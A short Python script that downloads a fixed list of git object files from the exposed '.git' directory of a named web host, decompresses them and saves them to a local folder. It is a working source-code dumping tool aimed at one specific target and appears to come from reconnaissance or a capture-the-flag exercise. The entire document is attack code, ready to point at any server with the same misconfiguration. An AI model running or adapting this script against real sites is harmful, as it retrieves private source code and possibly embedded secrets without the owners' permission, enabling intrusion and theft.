#!/usr/bin/env python3
import os
import requests
import zlib

# Base URL
BASE_URL = "https://c5.0hl.cc/.git/"

# Object hashes (full path with directory structure)
objects = [
    "88/9b09d697ad44417576e452438ea5a38123efa4",
    "30/1e5f17a847d47d4b52c7fda63f232578137f21",
    "1c/ae10ab0cbd6a604fd8bdf7cf2513aefd862873",
    "21/f9afb01ac8481b52e895da845f246ad9d689c6",
    "5c/76c48cd7e3b34112730e81cb245102cf4aef18",
    "bb/fab62b69ddbd15a0115bd083ce7c96651bbca7",
    "8c/7c34319fa6c96d334b0ce2c51aa17ba41fa7b7",
    "9d/c1592e040190ed3e691253db6a692c7f49784e",
    "3d/9da8acdb30f75c5146905c837217e782b9a2d4",
    "6e/570f7a7b67b0fd922a0324e87787abd2a7c1ad",
    "d0/52d0f4d9b057a7af1837cd827f3e8df58dedad",
    "e8/bd18e6f23fec598e2a8e942914fa02bfba2405",
    "aa/afeb05e10aa404b862f57375b2c926b65a882b",
]

# Create output directory
OUTPUT_DIR = "git_objects_decoded"
os.makedirs(OUTPUT_DIR, exist_ok=True)

def download_and_decode():
    print("[*] Downloading and decoding git objects...")
    
    for obj_path in objects:
        url = BASE_URL + "objects/" + obj_path
        hash_name = obj_path.replace("/", "_")
        
        try:
            response = requests.get(url, timeout=10)
            if response.status_code != 200:
                print(f"[-] Failed: {obj_path}")
                continue
            
            # Decompress the git object
            try:
                decompressed = zlib.decompress(response.content)
                text = decompressed.decode('utf-8', errors='ignore')
            except:
                # If decompression fails, try to decode raw
                text = response.content.decode('utf-8', errors='ignore')
            
            # Save to file
            output_file = os.path.join(OUTPUT_DIR, f"{hash_name}.txt")
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(f"=== Object: {obj_path} ===\n")
                f.write(text)
                f.write("\n")
            
            print(f"[+] Saved: {hash_name}.txt ({len(text)} chars)")
            
        except Exception as e:
            print(f"[-] Error with {obj_path}: {e}")

if __name__ == "__main__":
    download_and_decode()
    print("\n[*] All objects saved to:", OUTPUT_DIR)
